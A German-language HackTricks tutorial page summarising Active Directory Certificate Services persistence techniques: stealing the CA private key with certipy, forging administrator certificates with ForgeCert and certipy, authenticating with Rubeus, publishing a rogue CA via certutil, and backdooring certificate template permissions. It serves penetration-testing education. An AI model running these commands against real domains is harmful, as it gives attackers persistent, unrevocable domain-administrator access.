# AD CS Domänenpersistenz

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

**Dies ist eine Zusammenfassung der Domänenpersistenztechniken, die in [https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) geteilt wurden**. Überprüfen Sie es für weitere Details.

## Fälschen von Zertifikaten mit gestohlenen CA-Zertifikaten - DPERSIST1

Wie kann man feststellen, dass ein Zertifikat ein CA-Zertifikat ist?

Es kann festgestellt werden, dass ein Zertifikat ein CA-Zertifikat ist, wenn mehrere Bedingungen erfüllt sind:

- Das Zertifikat wird auf dem CA-Server gespeichert, wobei der private Schlüssel durch die DPAPI der Maschine oder durch Hardware wie TPM/HSM gesichert ist, wenn das Betriebssystem dies unterstützt.
- Die Issuer- und Subject-Felder des Zertifikats stimmen mit dem Distinguished Name des CAs überein.
- Eine "CA-Version"-Erweiterung ist ausschließlich in den CA-Zertifikaten vorhanden.
- Das Zertifikat enthält keine Extended Key Usage (EKU)-Felder.

Um den privaten Schlüssel dieses Zertifikats zu extrahieren, ist das Tool `certsrv.msc` auf dem CA-Server die unterstützte Methode über die integrierte GUI. Dennoch unterscheidet sich dieses Zertifikat nicht von anderen, die im System gespeichert sind. Daher können Methoden wie die [THEFT2-Technik](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) zur Extraktion angewendet werden.

Das Zertifikat und der private Schlüssel können auch mit dem folgenden Befehl mit Certipy erhalten werden:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Nachdem das CA-Zertifikat und der private Schlüssel im `.pfx`-Format erlangt wurden, können Tools wie [ForgeCert](https://github.com/GhostPack/ForgeCert) verwendet werden, um gültige Zertifikate zu generieren:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
{% hint style="warning" %}
Der Benutzer, der für die Zertifikatsfälschung ins Visier genommen wird, muss aktiv sein und sich in Active Directory authentifizieren können, damit der Prozess erfolgreich ist. Das Fälschen eines Zertifikats für spezielle Konten wie krbtgt ist unwirksam.
{% endhint %}

Dieses gefälschte Zertifikat ist **gültig** bis zum angegebenen Enddatum und solange das Root-CA-Zertifikat **gültig ist** (normalerweise 5 bis **10+ Jahre**). Es ist auch für **Maschinen** gültig, sodass ein Angreifer in Kombination mit **S4U2Self** auf jeder Domänenmaschine **dauerhaft bestehen bleiben kann**, solange das CA-Zertifikat gültig ist.\
Darüber hinaus können die mit dieser Methode generierten **Zertifikate nicht widerrufen werden**, da die CA nichts von ihnen weiß.

## Vertrauen in Rogue-CA-Zertifikate - DPERSIST2

Das Objekt `NTAuthCertificates` ist so definiert, dass es ein oder mehrere **CA-Zertifikate** in seinem Attribut `cacertificate` enthält, das von Active Directory (AD) verwendet wird. Der Überprüfungsprozess durch den **Domänencontroller** besteht darin, das `NTAuthCertificates`-Objekt nach einem Eintrag zu überprüfen, der mit der im Ausstellerfeld des authentifizierenden **Zertifikats** angegebenen **CA übereinstimmt**. Die Authentifizierung wird fortgesetzt, wenn eine Übereinstimmung gefunden wird.

Ein selbstsigniertes CA-Zertifikat kann von einem Angreifer dem `NTAuthCertificates`-Objekt hinzugefügt werden, sofern er die Kontrolle über dieses AD-Objekt hat. Normalerweise haben nur Mitglieder der Gruppe **Enterprise Admin**, zusammen mit **Domain Admins** oder **Administratoren** in der **Stammdomäne des Forests**, die Berechtigung, dieses Objekt zu ändern. Sie können das `NTAuthCertificates`-Objekt mit `certutil.exe` und dem Befehl `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA126` bearbeiten oder das [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) verwenden.

Diese Fähigkeit ist besonders relevant, wenn sie in Verbindung mit einer zuvor beschriebenen Methode verwendet wird, bei der ForgeCert verwendet wird, um Zertifikate dynamisch zu generieren.

## Bösartige Fehlkonfiguration - DPERSIST3

Möglichkeiten zur **Beharrlichkeit** durch **Sicherheitsdeskriptoränderungen von AD CS**-Komponenten sind zahlreich. Die in der Sektion "[Domain-Eskalation](domain-escalation.md)" beschriebenen Änderungen können von einem Angreifer mit erhöhtem Zugriff bösartig implementiert werden. Dies umfasst die Hinzufügung von "Kontrollrechten" (z. B. WriteOwner/WriteDACL/etc.) zu sensiblen Komponenten wie:

- Das **AD-Computerobjekt des CA-Servers**
- Der **RPC/DCOM-Server des CA-Servers**
- Jedes **nachgeordnete AD-Objekt oder Container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (z. B. der Container für Zertifikatvorlagen, der Container für Zertifizierungsstellen, das NTAuthCertificates-Objekt usw.)
- **AD-Gruppen, denen standardmäßig oder von der Organisation Rechte zur Steuerung von AD CS delegiert wurden** (wie die integrierte Cert Publishers-Gruppe und ihre Mitglieder)

Ein Beispiel für eine bösartige Implementierung wäre, wenn ein Angreifer mit erhöhten Berechtigungen in der Domäne die Berechtigung **`WriteOwner`** zur Standardzertifikatvorlage **`User`** hinzufügt und selbst der Hauptbenutzer für dieses Recht ist. Um dies auszunutzen, würde der Angreifer zunächst das Eigentum an der **`User`**-Vorlage auf sich selbst ändern. Anschließend würde das **`mspki-certificate-name-flag`** auf der Vorlage auf **1** gesetzt, um **`ENROLLEE_SUPPLIES_SUBJECT`** zu aktivieren, sodass ein Benutzer einen alternativen Namen im Antrag angeben kann. Danach könnte der Angreifer sich mit der **Vorlage** anmelden, einen **Domänenadministrator**-Namen als alternativen Namen wählen und das erhaltene Zertifikat zur Authentifizierung als DA verwenden.


<details>

<summary><strong>Erlernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>
